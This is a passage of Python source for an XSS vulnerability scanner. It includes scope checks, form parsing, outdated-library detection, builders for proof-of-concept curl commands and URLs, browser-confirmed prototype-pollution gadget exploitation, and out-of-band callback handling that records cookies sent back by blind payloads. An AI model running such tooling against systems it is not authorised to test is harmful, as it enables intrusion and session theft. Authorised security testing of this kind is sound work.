    return any(re.search(pattern, content, re.IGNORECASE) for _, pattern in DOM_SINKS)


# --------------------------------------------------------------------------------------
# JavaScript library vulnerability detection
# --------------------------------------------------------------------------------------


@dataclass
class VulnerableLib:
    name: str
    version: str
    cve: str
    severity: str
    url: str = ""


def parse_version(version_str: str) -> Tuple[int, ...]:
    """Parse a version string into a tuple of integers for comparison."""
    try:
        # Remove non-numeric suffixes like -beta, -rc1, etc.
        cleaned = re.sub(r"[-+].*$", "", version_str)
        # Handle v prefix
        cleaned = cleaned.lstrip("v")
        parts = [int(x) for x in cleaned.split(".")]
        return tuple(parts)
    except (ValueError, AttributeError):
        return (0,)


def version_in_range(version: str, min_ver: str, max_ver: str) -> bool:
    """Check if a version is within the vulnerable range (inclusive)."""
    try:
        v = parse_version(version)
        min_v = parse_version(min_ver)
        max_v = parse_version(max_ver)
        return min_v <= v <= max_v
    except Exception:
        return False


def extract_lib_version_from_filename(filename: str) -> Optional[Tuple[str, str]]:
    """Extract library name and version from a script filename."""
    filename = filename.lower()
    # Common patterns: jquery-3.4.0.min.js, angular.1.7.9.js, etc.
    patterns = [
        r"jquery[-._]?(\d+[.\d]*)",  # jquery-3.4.0, jquery.3.4.0
        r"angular[-._]?(\d+[.\d]*)",  # angular-1.7.9
        r"react[-._]?(\d+[.\d]*)",  # react-16.3.0
        r"vue[-._]?(\d+[.\d]*)",  # vue-2.5.16
        r"bootstrap[-._]?(\d+[.\d]*)",  # bootstrap-4.3.1
        r"d3[-._]?(\d+[.\d]*)",  # d3-3.5.16
        r"handlebars[-._]?(\d+[.\d]*)",  # handlebars-4.0.11
        r"lodash[-._]?(\d+[.\d]*)",  # lodash-4.17.14
        r"moment[-._]?(\d+[.\d]*)",  # moment-2.24.0
        r"axios[-._]?(\d+[.\d]*)",  # axios-0.19.0
        r"ckeditor[-._]?(\d+[.\d]*)",  # ckeditor-4.11.4
        r"tinymce[-._]?(\d+[.\d]*)",  # tinymce-4.9.11
        r"prototype[-._]?(\d+[.\d]*)",  # prototype-1.7.3
        r"scriptaculous[-._]?(\d+[.\d]*)",  # scriptaculous-1.9.0
        r"swfobject[-._]?(\d+[.\d]*)",  # swfobject-2.2.0
    ]
    for pattern in patterns:
        match = re.search(pattern, filename)
        if match:
            lib_name = pattern.split(r"[-._]?")[0]
            version = match.group(1)
            return lib_name, version
    return None


def extract_lib_version_from_content(content: str) -> List[Tuple[str, str]]:
    """Extract library names and versions from script content using common patterns."""
    results: List[Tuple[str, str]] = []
    lowered = content.lower()
    
    # jQuery version detection
    jquery_match = re.search(r"jquery\s*v?(\d+[.\d]*)", lowered)
    if jquery_match:
        results.append(("jquery", jquery_match.group(1)))
    
    # Angular version detection
    angular_match = re.search(r"angular\.version\s*=\s*\{[^}]*full\s*:\s*['\"](\d+[.\d]*)", lowered)
    if angular_match:
        results.append(("angular", angular_match.group(1)))
    
    # React version detection
    react_match = re.search(r"react[\s_-]?version\s*[:=]\s*['\"](\d+[.\d]*)", lowered)
    if react_match:
        results.append(("react", react_match.group(1)))
    
    # Vue version detection
    vue_match = re.search(r"vue[\s_-]?version\s*[:=]\s*['\"](\d+[.\d]*)", lowered)
    if vue_match:
        results.append(("vue", vue_match.group(1)))
    
    # Bootstrap version detection
    bootstrap_match = re.search(r"bootstrap[\s_-]?version\s*[:=]\s*['\"](\d+[.\d]*)", lowered)
    if bootstrap_match:
        results.append(("bootstrap", bootstrap_match.group(1)))
    
    return results


def check_vulnerable_libs(
    script_url: str, 
    script_content: str = ""
) -> List[VulnerableLib]:
    """Check if a script uses a known vulnerable library version."""
    vulnerabilities = []
    
    # Check filename first
    filename = urlsplit(script_url).path.split("/")[-1]
    from_filename = extract_lib_version_from_filename(filename)
    
    libs_to_check = []
    if from_filename:
        libs_to_check.append(from_filename)
    
    # Also check content if available
    if script_content:
        from_content = extract_lib_version_from_content(script_content)
        libs_to_check.extend(from_content)
    
    # Check each detected library against the vulnerability database
    for lib_name, version in libs_to_check:
        lib_name_lower = lib_name.lower()
        if lib_name_lower in VULNERABLE_LIBS:
            for base_ver, (min_ver, max_ver, cve, severity) in VULNERABLE_LIBS[lib_name_lower].items():
                if version_in_range(version, min_ver, max_ver):
                    vulnerabilities.append(
                        VulnerableLib(
                            name=lib_name,
                            version=version,
                            cve=cve,
                            severity=severity,
                            url=script_url
                        )
                    )
                    break  # One vulnerability report per library per URL
    
    return vulnerabilities

# --------------------------------------------------------------------------------------
# Browser engine
# --------------------------------------------------------------------------------------

from xoxss.core.browser import BrowserEngine, BrowserPool, PlaywrightEngine


# --------------------------------------------------------------------------------------
# Form parsing helpers
# --------------------------------------------------------------------------------------


def default_field_value(field_type: str, name: str = "") -> str:
    field_type = (field_type or "text").lower()
    if field_type == "email":
        return "xoxss@example.com"
    if field_type == "number":
        return "1"
    if field_type == "tel":
        return "1234567890"
    if field_type == "url":
        return "https://example.com"
    if field_type == "password":
        return "XoxssPass1!"
    if field_type == "date":
        return "2024-01-01"
    if field_type == "search":
        return "test"
    if any(word in (name or "").lower() for word in ("search", "query", "q")):
        return "test"
    return "test"


def parse_form(form: Any, page_url: str) -> Tuple[str, str, Dict[str, FormField]]:
    action = urljoin(page_url, form.get("action") or page_url)
    method = (form.get("method") or "get").strip().lower()
    fields: Dict[str, FormField] = {}

    for element in form.find_all(["input", "textarea", "select"]):
        name = element.get("name")
        if not name:
            continue
        tag = element.name.lower()
        field_type = (element.get("type") or ("text" if tag == "input" else tag)).lower()
        if tag == "input" and field_type in ("submit", "button", "reset", "image", "file"):
            continue
        if tag == "input" and field_type in ("checkbox", "radio") and not element.has_attr("checked"):
            continue
        if tag == "select":
            option = element.find("option", selected=True) or element.find("option")
            value = ""
            if option is not None:
                value = option.get("value", option.get_text(strip=True))
        elif tag == "textarea":
            value = element.get_text()
        else:
            value = element.get("value")
            if value is None:
                value = default_field_value(field_type, name)
        fields[name] = FormField(name=name, value=value, type=field_type, tag=tag)

    return action, method, fields

# --------------------------------------------------------------------------------------
# Scope
# --------------------------------------------------------------------------------------


class Scope:
    def __init__(
        self,
        base_url: str,
        allow_subdomains: bool = False,
        include: Optional[Sequence[str]] = None,
        exclude: Optional[Sequence[str]] = None,
    ):
        parts = urlsplit(base_url)
        self.host = self._canonical_host(parts.hostname or "")
        try:
            self.base_port = parts.port
        except ValueError:
            self.base_port = -1
        self.allow_subdomains = allow_subdomains
        self.include = [re.compile(pattern, re.I) for pattern in (include or [])]
        self.exclude = [re.compile(pattern, re.I) for pattern in (exclude or [])]

    @staticmethod
    def _canonical_host(host: str) -> str:
        try:
            return host.rstrip(".").encode("idna").decode("ascii").lower()
        except (UnicodeError, AttributeError):
            return ""

    def in_scope(self, url: str) -> bool:
        try:
            parts = urlsplit(url)
        except ValueError:
            return False
        if parts.scheme not in ("http", "https"):
            return False
        if parts.username is not None or parts.password is not None or self.base_port == -1:
            return False
        host = self._canonical_host(parts.hostname or "")
        if not host:
            return False
        try:
            candidate_port = parts.port
        except ValueError:
            return False
        allowed_ports = {self.base_port} if self.base_port is not None else {80, 443}
        effective_port = candidate_port or (443 if parts.scheme == "https" else 80)
        if effective_port not in allowed_ports:
            return False
        if self.allow_subdomains:
            if host != self.host and not host.endswith("." + self.host):
                return False
        elif host != self.host:
            return False
        if self.include and not any(regex.search(url) for regex in self.include):
            return False
        if any(regex.search(url) for regex in self.exclude):
            return False
        return True


# Keys whose values must never appear in a shared PoC (JSON request bodies).
SENSITIVE_KEY_RE = re.compile(
    r"[a-z0-9_-]*(csrf|xsrf|token|session|auth|password|passwd|secret|cookie|api[._-]?key|key)[a-z0-9_-]*",
    re.IGNORECASE,
)


def build_form_html_poc(point: InjectionPoint, payload: str) -> str:
    """Self-contained HTML form PoC (base64 data URL) for POST form points.

    The URL-encoded curl command is exact and scriptable; this variant is handy
    for reviewers who prefer a browser: opening the data URL renders a form
    that reproduces the same request with one click.
    """
    if point.method.upper() == "GET":
        return ""
    if point.source == "json":
        return ""
    fields = {name: spec.value for name, spec in point.fields.items()}
    fields[point.param] = payload
    hidden = "\n".join(
        f'<input type="hidden" name="{html.escape(name)}" '
        f'value="{html.escape(value)}">'
        for name, value in fields.items()
    )
    document = (
        "<!doctype html><meta charset=\"utf-8\">"
        "<title>XOXSS PoC</title>"
        f'<form method="post" action="{html.escape(point.url)}">'
        f"{hidden}<button type=\"submit\">Submit XOXSS PoC</button></form>"
    )
    encoded = base64.b64encode(document.encode("utf-8", "replace")).decode("ascii")
    return f"data:text/html;base64,{encoded}"


def build_poc(point: InjectionPoint, payload: str) -> Tuple[str, str]:
    """Build the reproduction proof for an injection point.

    Returns ``(poc_url, poc_command)``: a ready-to-open URL for GET
    query/form/fragment/path points and a shell one-liner (curl) for JSON,
    header, cookie and POST points.  The PoC embeds only the injected
    parameter - never cookies, CSRF tokens or other session data (documented
    under "Reports" in the README) - so the proof is safe to share as-is.
    """
    method = point.method.upper()
    if method == "GET":
        if point.source == "path":
            return render_path_payload(point.url, payload), ""
        if point.source == "fragment":
            base = point.url.split("#", 1)[0]
            return f"{base}#{payload}", ""
        if point.source in ("query", "form", "api"):
            try:
                if point.source == "query":
                    return replace_query_param(point.url, point.param, payload), ""
                values = {name: spec.value for name, spec in point.fields.items()}
                values[point.param] = payload
                return merge_query(point.url, values), ""
            except Exception:
                return point.url, ""
        if point.source == "header" and point.param:
            command = f"curl -sk '{point.url}' -H '{point.param}: {payload}'"
            return point.url, command
        if point.source == "cookie" and point.param:
            command = f"curl -sk '{point.url}' -H 'Cookie: {point.param}={payload}'"
            return point.url, command
        return point.url, ""
    if point.source == "json":
        body: Dict[str, Any] = dict(point.json_body or {})
        body[point.param] = payload
        # Session-bound keys are redacted so the shared curl never carries
        # CSRF tokens, cookies or credentials from the operator's session.
        for key in list(body):
            if key != point.param and SENSITIVE_KEY_RE.fullmatch(key):
                body[key] = "REDACTED"
        try:
            serialized = json.dumps(body, separators=(",", ":"))
        except Exception:
            serialized = json.dumps({point.param: payload})
        content_type = point.content_type or "application/json"
        command = (
            f"curl -sk -X POST '{point.url}' "
            f"-H 'Content-Type: {content_type}' --data-raw {shlex.quote(serialized)}"
        )
        return point.url, command
    body_data = urlencode({point.param: payload})
    command = f"curl -sk -X POST '{point.url}' --data '{body_data}'"
    return point.url, command


# --------------------------------------------------------------------------------------
# Scanner
# --------------------------------------------------------------------------------------


class XSSScanner(CrawlerMixin):
    def __init__(self, target: str, args: argparse.Namespace, console: Console):
        if not re.match(r"^https?://", target, re.IGNORECASE):
            target = "http://" + target
        self.target = normalize_url(target)
        self.args = args
        self.console = console
        self.stats = ScanStats()
        self.scope = Scope(
            self.target,
            allow_subdomains=getattr(args, "allow_subdomains", False),
            include=getattr(args, "include", None),
            exclude=getattr(args, "exclude", None),
        )
        # Subdomain/external recon is only useful when sibling hosts are in
        # scope; widen the base host to the registrable domain in that mode.
        if HAS_RECON and (
            getattr(args, "subdomains", False)
            or int(getattr(args, "subdomain_brute", 0) or 0) > 0
            or getattr(args, "external_tools", False)
        ):
            base_domain = root_domain(self.scope.host) if root_domain else self.scope.host
            if base_domain:
                self.scope.host = base_domain
                self.scope.allow_subdomains = True
        self.state = StateStore(self.target, args.state_dir, enabled=not args.no_state, console=console)
        # A corpus can hold thousands of entries; when several targets are scanned
        # in one run, parse it once and share the read-only engine.
        cached_payloads = getattr(args, "_payload_engine", None)
        if cached_payloads is None:
            cached_payloads = PayloadEngine(
                console,
                args.payload_file,
                remote_files=getattr(args, "payload_files", None),
                corpus_dirs=getattr(args, "payload_dir", None),
                lazy_payloads=getattr(args, "lazy_payloads", True),
            )
            try:
                setattr(args, "_payload_engine", cached_payloads)
            except Exception:
                pass
        self.payloads = cached_payloads
        self._cookies = self._parse_cookies(
            getattr(args, "cookies", None),
            getattr(args, "cookie_file", None),
        )
        self.http = HttpEngine(
            console,
            self.stats,
            headers=self._parse_headers(args.headers),
            cookies=self._cookies,
            timeout=args.timeout,
            retries=args.retries,
            rate=args.rate_limit,
            concurrency=args.concurrency,
            per_host_concurrency=getattr(args, "per_host_concurrency", 4),
            proxy=args.proxy,
            insecure=args.insecure,
            redirect_scope=self.scope.in_scope,
            max_response_bytes=getattr(args, "max_response_bytes", 5 * 1024 * 1024),
            auth_state=getattr(args, "auth_state", None),
            http2=getattr(args, "http2", False),
            impersonate=getattr(args, "impersonate", None),
        )
        
        # Enable smart rate limiting if requested
        if HAS_ADVANCED and getattr(args, 'smart_rate', False):
            self.http.enable_smart_rate(args.rate_limit or 10.0)
        self.pool: Optional[BrowserPool] = None
        self.waf = WAFReport()
        self.findings: List[Finding] = []
        self._finding_keys: Set[str] = set()
        self._confirmed_contexts: Set[Tuple[str, str, str]] = set()
        # Opt-in AI fallback.  The key resolution order is CLI -> env -> .env;
        # the analyzer is only constructed when a key is actually available.
        self.ai: Any = None
        self._ai_disabled_reason = ""
        if HAS_AI and AIAnalyzer is not None and (getattr(args, "ai", False) or getattr(args, "ai_key", None)):
            ai_key = resolve_ai_key(getattr(args, "ai_key", None))
            if ai_key:
                ai_model = resolve_ai_model(
                    getattr(args, "ai_model", None) or DEFAULT_AI_MODEL
                )
                self.ai = AIAnalyzer(
                    ai_key,
                    model=ai_model,
                    endpoint=getattr(args, "ai_url", None) or DEFAULT_AI_ENDPOINT,
                    timeout=getattr(args, "ai_timeout", None) or 60.0,
                    console=console,
                )
                console.info(
                    f"AI fallback enabled ({ai_model}); candidates still require "
                    "deterministic reflection/execution evidence",
                    important=False,
                )
            else:
                self._ai_disabled_reason = (
                    "--ai requested but no key found (use --ai-key, XOXSS_AI_KEY, "
                    "OPENROUTER_API_KEY or .env)"
                )
                console.warn(self._ai_disabled_reason)
        self._ai_only = bool(getattr(args, "ai_only", False) and self.ai is not None)
        self._stop = asyncio.Event()
        self._status_task: Optional[asyncio.Task] = None
        self.screenshot_dir = Path(args.state_dir) / "screenshots"
        self._stored_checked: Set[str] = set()
        self._stored_hit_response: Optional[HttpResponse] = None
        self.mutation_findings: List[Dict[str, str]] = []
        self._mutation_probed: Set[str] = set()
        self._mutation_observations: Dict[str, List[MutationObservation]] = {}
        self._proto_tested: Set[str] = set()
        self._proto_warned = False
        self.blind_url: Optional[str] = getattr(args, "blind", None)
        self.blind_markers: List[Dict[str, str]] = []
        self._blind_points: Set[str] = set()
        self.endpoints: Set[str] = set()
        self.endpoint_sources: Dict[str, Set[str]] = {}
        self._js_files_fetched: int = 0
        self._js_seen: Set[str] = set()
        self.vulnerable_libs: List[VulnerableLib] = []

        # Reconnaissance / JS intelligence / out-of-band state
        self.subdomains: List[str] = []
        self.passive_urls: List[str] = []
        self.js_intel: List[Any] = []
        self.api_operations: List[Any] = []
        self.external_findings: List[Any] = []
        self.external_summary: str = ""
        self._mined_params: Dict[str, List[str]] = {}
        self._browser_points: Dict[str, List[InjectionPoint]] = {}
        self.discovered_param_names: List[str] = []
        self._param_wordlist_cache: Optional[List[str]] = None
        self._ast_seen: Set[str] = set()
        self.oob: Optional[OOBManager] = None  # type: ignore[valid-type]
        self._oob_task: Optional[asyncio.Task] = None
        
        # Advanced features (Phase 1 & 2)
        self.jsonp_findings: List[Dict] = []
        self.csp_issues: List[Dict] = []
        self.mxss_findings: List[Dict] = []
        self.proto_pollution_findings: List[Dict] = []
        self.cors_issues: List[Dict] = []
        self.trusted_types_issues: List[Dict] = []
        self.dom_clobber_findings: List[Dict] = []
        self.postmessage_findings: List[Dict] = []
        self.websocket_findings: List[Dict] = []
        self.file_upload_findings: List[Dict] = []
        self.graphql_endpoints: List[Dict] = []
        # Adaptive rate limiting is handled above via HttpEngine.enable_smart_rate(),
        # which installs an internal SmartRateLimiter and records every request;
        # replacing self.http.limiter here would bypass that mechanism.

    # -- setup ------------------------------------------------------------------------
    @staticmethod
    def _parse_headers(values: Optional[Sequence[str]]) -> Dict[str, str]:
        headers: Dict[str, str] = {}
        for item in values or []:
            if ":" in item:
                name, value = item.split(":", 1)
                headers[name.strip()] = value.strip()
        return headers

    @staticmethod
    def _cookies_from_text(text: str) -> Dict[str, str]:
        """Parse ``name=value`` pairs from a header string or line set."""
        cookies: Dict[str, str] = {}
        value = (text or "").strip()
        if value.lower().startswith("cookie:"):
            value = value.split(":", 1)[1]
        for chunk in re.split(r"[;\r\n]+", value):
            chunk = chunk.strip()
            if not chunk or chunk.startswith("#") or "=" not in chunk:
                continue
            name, cookie_value = chunk.split("=", 1)
            name = name.strip()
            if name:
                cookies[name] = cookie_value.strip()
        return cookies

    @staticmethod
    def _parse_cookie_file(path: Path) -> Dict[str, str]:
        """Parse JSON, Netscape or header/line cookie files.

        Supported shapes:

        * JSON object ``{"name": "value"}`` or Playwright-style
          ``{"cookies": [{"name": ..., "value": ...}]}``
        * JSON array of ``[name, value]`` pairs or ``{"name", "value"}`` objects
        * Netscape ``cookies.txt`` (7 tab-separated fields)
        * plain ``name=value`` lines (or a ``Cookie:`` header)
        """
        try:
            text = path.read_text(encoding="utf-8-sig", errors="replace")
        except Exception:
            return {}
        stripped = text.lstrip()
        if stripped.startswith(("[", "{")):
            try:
                payload = json.loads(stripped)
            except Exception:
                payload = None
            cookies: Dict[str, str] = {}
            if isinstance(payload, dict):
                raw = payload.get("cookies")
                if isinstance(raw, list):
                    for item in raw:
                        if isinstance(item, dict) and item.get("name"):
                            cookies[str(item["name"])] = str(item.get("value", ""))
                else:
                    for name, value in payload.items():
                        if isinstance(value, (str, int, float)):
                            cookies[str(name)] = str(value)
            elif isinstance(payload, list):
                for item in payload:
                    if isinstance(item, dict) and item.get("name"):
                        cookies[str(item["name"])] = str(item.get("value", ""))
                    elif isinstance(item, (list, tuple)) and len(item) >= 2:
                        cookies[str(item[0])] = str(item[1])
            if cookies:
                return cookies
        cookies = {}
        for line in text.splitlines():
            line = line.rstrip("\r\n")
            if not line.strip():
                continue
            # Netscape format: #HttpOnly_ prefix is data, plain # is a comment.
            if line.startswith("#HttpOnly_"):
                line = line[len("#HttpOnly_"):]
            elif line.lstrip().startswith("#"):
                continue
            if "\t" in line:
                fields = line.split("\t")
                if len(fields) >= 7 and fields[5].strip():
                    cookies[fields[5].strip()] = fields[6].strip()
                    continue
            cookies.update(XSSScanner._cookies_from_text(line))
        return cookies

    @staticmethod
    def _parse_cookies(
        values: Optional[Sequence[str]],
        files: Optional[Sequence[str]] = None,
    ) -> Dict[str, str]:
        cookies: Dict[str, str] = {}
        for item in values or []:
            if not item:
                continue
            candidate = Path(item).expanduser()
            try:
                is_file = candidate.is_file()
            except OSError:
                is_file = False
            if is_file:
                cookies.update(XSSScanner._parse_cookie_file(candidate))
                continue
            cookies.update(XSSScanner._cookies_from_text(item))
        for item in files or []:
            candidate = Path(item).expanduser()
            cookies.update(XSSScanner._parse_cookie_file(candidate))
        return cookies

    def transform_payload(self, payload: str) -> str:
        """Apply the tamper transform and the optional encoder chain."""
        result = apply_tamper(payload, getattr(self.args, "tamper", None))
        chain = getattr(self.args, "encoder", None) or []
        if chain and HAS_RECON and apply_encoder_chain is not None:
            try:
                result = apply_encoder_chain(result, chain)
            except Exception as exc:  # unknown encoder / transform failure
                self.console.debug(f"Encoder chain failed: {exc}")
        return result

    def _browser_factory(self) -> Any:
        use_playwright = (self.args.browser or "").lower() == "playwright" or bool(
            getattr(self.args, "auth_state", None)
        )
        engine_class = PlaywrightEngine if use_playwright else BrowserEngine
        return engine_class(
            self.console,
            kind="playwright" if use_playwright else self.args.browser,
            headless=self.args.headless,
            page_timeout=max(10.0, self.args.timeout),
            user_agent=self.args.user_agent,
            proxy=self.args.proxy,
            binary=self.args.binary,
            insecure=self.args.insecure,
            url_allowed=self.scope.in_scope,
            auth_state=getattr(self.args, "auth_state", None),
        )

    # -- prototype pollution ----------------------------------------------------------
    async def test_proto_pollution(self, url: str) -> None:
        """Prove client-side prototype pollution and exercise known gadgets.

        Static source patterns are hints at best: they cannot show that a parser
        accepts ``__proto__`` or that the polluted property is later consumed.  This
        drives a real page, requires a unique marker to be visible on a *fresh*
        object, and only then tries gadget-specific exploit URLs.
        """
        if not HAS_ADVANCED or build_proto_probes is None or not PROTO_PROBE_JS:
            return
        if self.pool is None or not self.pool.engines:
            if not self._proto_warned:
                self.console.warn(
                    "--proto-pollution needs a browser for runtime verification; "
                    "static hints only"
                )
                self._proto_warned = True
            return
        if url in self._proto_tested:
            return
        self._proto_tested.add(url)

        marker = unique_token("pp", 10)
        probes = build_proto_probes(url, marker)
        try:
            async with self.pool.borrow() as browser:
                for probe_url, probe in probes:
                    if self._stop.is_set():
                        return
                    await browser.navigate(probe_url)
                    result = await browser.evaluate(PROTO_PROBE_JS, {"marker": marker})
                    self.stats.browser_checks += 1
                    if not isinstance(result, dict) or not result.get("polluted"):
                        continue

                    values = [str(item) for item in (result.get("values") or []) if item]
                    evidence = values[0] if values else marker
                    added = self.add_finding(
                        Finding(
                            kind="Prototype Pollution (confirmed)",
                            url=probe_url,
                            parameter=probe.parameter,
                            method="GET",
                            payload=f"{probe.parameter}={marker}",
                            evidence=f"Object.prototype.{PROTO_MARKER_KEY} == {evidence}",
                            confidence="confirmed",
                            context=f"client-side ({probe.location})",
                            detail=(
                                "A fresh object inherited the marker after the page consumed "
                                "the probe, so attacker-controlled input reaches a merge or "
                                "assignment sink that copies __proto__."
                            ),
                            tags=["prototype-pollution"],
                            subkey=probe.parameter,
                            poc_url=probe_url,
                            source="proto",
                            sink=f"Object.prototype.{PROTO_MARKER_KEY}",
                        )
                    )
                    if added:
                        self.console.ok(
                            f"Prototype pollution confirmed via {probe.location}: "
                            f"{truncate(url, 90)}"
                        )

                    gadgets = result.get("gadgets") or []
                    fingerprinted = [
                        str(item.get("name"))
                        for item in gadgets
                        if isinstance(item, dict) and item.get("name")
                    ]
                    self.console.debug(f"Gadgets on page: {', '.join(fingerprinted) or 'none'}")
                    names = gadget_exploit_names(gadgets) if gadget_exploit_names else []
                    await self._exploit_proto_gadgets(browser, url, names)
                    return
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            self.console.debug(f"Prototype pollution check failed for {truncate(url, 90)}: {str(exc)[:160]}")

    async def _exploit_proto_gadgets(
        self, browser: BrowserEngine, url: str, names: Sequence[str]
    ) -> None:
        """Turn a confirmed pollution primitive into a gadget-specific XSS proof."""
        if build_proto_exploit is None:
            return
        candidate: Optional[Tuple[str, str, str]] = None
        for name in list(dict.fromkeys(names))[:4]:
            if self._stop.is_set():
                return
            exploit_marker = unique_token("pg", 10)
            exploit_url, pairs = build_proto_exploit(url, name, exploit_marker)
            if not exploit_url:
                continue
            await browser.navigate(exploit_url)
            hit = await browser.check_token(exploit_marker, timeout=2.0)
            self.stats.browser_checks += 1
            if hit and hit.get("executed") == "yes":
                # Browser-confirmed execution always carries a screenshot.
                screenshot = await browser.screenshot(
                    str(self.screenshot_dir / f"proto-{exploit_marker}.png")
                )
                self.add_finding(
                    Finding(
                        kind="Prototype Pollution to XSS (gadget)",
                        url=exploit_url,
                        parameter="__proto__",
                        method="GET",
                        payload=urlencode(dict(pairs)),
                        evidence=hit.get("evidence", ""),
                        confidence="confirmed",
                        context=f"client-side (gadget: {name})",
                        detail=(
                            f"The {name} gadget consumed the polluted property and "
                            "executed attacker JavaScript in the page origin."
                        ),
                        tags=["prototype-pollution", "xss"],
                        subkey=f"gadget:{name}",
                        poc_url=exploit_url,
                        source="proto",
                        sink=hit.get("sink") or "gadget",
                        dom_path=hit.get("dom_path") or "",
                        screenshot=screenshot,
                    )
                )
                self.console.ok(f"Prototype pollution gadget fired: {name}")
                return
            if candidate is None:
                candidate = (name, exploit_url, urlencode(dict(pairs)))

        if candidate is not None:
            name, exploit_url, payload = candidate
            self.add_finding(
                Finding(
                    kind="Prototype Pollution gadget (candidate)",
                    url=exploit_url,
                    parameter="__proto__",
                    method="GET",
                    payload=payload,
                    evidence=f"{name} fingerprinted; gadget did not fire automatically",
                    confidence="low",
                    context=f"client-side (gadget: {name})",
                    detail=(
                        "Pollution is confirmed, but the gadget needs a user interaction "
                        "or a different sink. The URL is a reproducible starting point."
                    ),
                    tags=["prototype-pollution"],
                    subkey=f"candidate:{name}",
                    poc_url=exploit_url,
                    source="proto",
                )
            )

    # -- top level --------------------------------------------------------------------
    async def run(self) -> List[Finding]:
        browser_available = False
        try:
            await self.http.start()
            resumed = self.state.load()
            if resumed and not self.args.no_resume:
                self._load_state()
            elif self.args.no_resume:
                self.state.reset()

            if not self._print_briefing():
                self.console.info(f"Target: {self.target}")
            if self.state.scanned:
                self.console.info(
                    f"Resume checkpoint: {len(self.state.scanned)} URL(s), "
                    f"{len(self.findings)} stored finding(s)"
                )

            self.console.rule("recon & waf fingerprint")
            self.waf = await WAFDetector(self.http, self.console, self.target).detect()
            self.state.waf = list(self.waf.names)

            if not self.args.no_browser:
                self.pool = BrowserPool(self.console, self.args.browser_workers, self._browser_factory)
                await self.pool.start()
                browser_available = bool(self.pool.engines)

            self._status_task = asyncio.create_task(self._status_loop())
            await self._start_oob()
            if self.oob is not None:
                self._oob_task = asyncio.create_task(self._oob_loop())

            urls = await self.prepare_urls()
            self.stats.urls_total = len(urls)
            self.console.event(
                "discovery_completed", target=self.target, urls=len(urls),
                endpoints=len(self.endpoints), js_files=self.stats.js_files,
            )
            self.console.info(f"Scanning {len(urls)} URL(s) with {self.args.threads} worker(s)")
            self.console.rule("attack")
            await self._scan_urls(urls)
            await self._run_external_findings(urls)
            await self._drain_oob()
        except asyncio.CancelledError:
            self.console.warn("Scan cancelled - saving checkpoint")
            self.state.save(force=True)
            raise
        finally:
            self._stop.set()
            if self._oob_task is not None:
                self._oob_task.cancel()
                with suppress(asyncio.CancelledError, Exception):
                    await self._oob_task
                self._oob_task = None
            if self.oob is not None:
                self.state.extra["oob"] = self.oob.to_dict()
                with suppress(Exception):
                    await self.oob.close()
            if self._status_task:
                self._status_task.cancel()
                with suppress(asyncio.CancelledError, Exception):
                    await self._status_task
                self._status_task = None
            try:
                self.stats.endpoints = len(self.endpoints)
                self.state.extra["endpoints"] = sorted(self.endpoints)[:5000]
                self.state.extra["endpoint_sources"] = {
                    endpoint: sorted(sources)
                    for endpoint, sources in list(self.endpoint_sources.items())[:5000]
                }
                self.state.save(force=True)
            finally:
                # Discovery and scanning can fail or be cancelled before the
                # success-only teardown below. Always release network/browser
                # resources so this scanner can be reused in the same process.
                if self.pool is not None:
                    with suppress(Exception):
                        await self.pool.stop()
                    self.pool = None
                with suppress(Exception):
                    await self.http.close()

        self.console.rule("reports & summary")
        self.print_summary()
        self.write_reports()
        self.console.event(
            "target_completed", target=self.target, findings=len(self.findings),
            stats=asdict(self.stats), browser_available=browser_available,
        )
        return self.findings

    def _load_state(self) -> None:
        fields = set(Finding.__dataclass_fields__)
        for raw in self.state.findings:
            try:
                finding = Finding(**{key: value for key, value in raw.items() if key in fields})
            except Exception:
                continue
            if not enforce_finding_policy(finding):
                continue
            if finding.key() in self._finding_keys:
                continue
            self.findings.append(finding)
            self._finding_keys.add(finding.key())
        self.stats.findings = len(self.findings)
        if self.state.waf:
            self.waf = WAFReport(names=list(self.state.waf))

    # -- out-of-band verification -------------------------------------------------------
    async def _start_oob(self) -> None:
        """Create the configured OOB transport (interactsh / HTTP / file)."""
        requested = (
            getattr(self.args, "interactsh", None)
            or getattr(self.args, "oob_poll", None)
            or getattr(self.args, "oob_file", None)
        )
        if not requested:
            return
        if not HAS_RECON or OOBManager is None:
            self.console.warn(
                "Out-of-band polling is unavailable: the recon/OOB modules failed to import"
            )
            return

        source = None
        server = getattr(self.args, "interactsh", None)
        poll_url = getattr(self.args, "oob_poll", None)
        oob_file = getattr(self.args, "oob_file", None)
        if server and InteractshClient is not None:
            source = InteractshClient(
                self.console,
                server=server,
                proxy=getattr(self.args, "proxy", None),
                insecure=getattr(self.args, "insecure", False),
                timeout=max(8.0, self.args.timeout),
            )
        elif oob_file and FilePoller is not None:
            source = FilePoller(self.console, oob_file, callback_base=self.blind_url or "")
        elif poll_url and CallbackPoller is not None:
            source = CallbackPoller(
                self.console,
                poll_url,
                timeout=max(5.0, self.args.timeout),
                insecure=getattr(self.args, "insecure", False),
                proxy=getattr(self.args, "proxy", None),
            )
        if source is None:
            return

        manager = OOBManager(
            self.console,
            source,
            poll_interval=max(1.0, float(getattr(self.args, "oob_interval", 5.0) or 5.0)),
        )
        if await manager.start():
            self.oob = manager
            self.state.extra["oob_transport"] = source.name
            self.console.info(f"Out-of-band transport: {source.name}", important=False)
        else:
            self.console.warn(
                f"Out-of-band transport {source.name} is unavailable; callbacks will not be confirmed"
            )

    async def _oob_loop(self) -> None:
        if self.oob is None:
            return
        interval = max(1.0, float(getattr(self.args, "oob_interval", 5.0) or 5.0))
        while not self._stop.is_set():
            try:
                await asyncio.wait_for(self._stop.wait(), timeout=interval)
                break
            except asyncio.TimeoutError:
                pass
            except asyncio.CancelledError:
                raise
            for hit in await self.oob.poll_once():
                self._confirm_oob(hit)

    def _confirm_oob(self, hit: Any) -> None:
        if self.oob is None:
            return
        registration = self.oob.registrations.get(hit.marker)
        if registration is None:
            return
        self.stats.oob_hits += 1
        self.state.extra["oob_hits"] = self.stats.oob_hits
        callback_context = parse_oob_context(hit.raw)
        cookies = callback_context.get("cookies") or []
        page_url = str(callback_context.get("page_url") or "")
        timestamp = str(hit.timestamp or "")
        evidence = (
            f"out-of-band callback observed via {hit.protocol or self.oob.source.name}"
            f" from {hit.remote_address or 'unknown'}"
            f"; page={page_url or 'n/a'}"
            f"; cookies={'; '.join(cookies) if cookies else 'none'}"
            + (f"; at {timestamp}" if timestamp else "")
        )
        detail = f"marker {hit.marker}; raw: {truncate(hit.raw, 300)}"
        oob_detail = {
            "marker": hit.marker,
            "protocol": hit.protocol,
            "callback": registration.callback,
            "remote_address": hit.remote_address,
            "timestamp": timestamp,
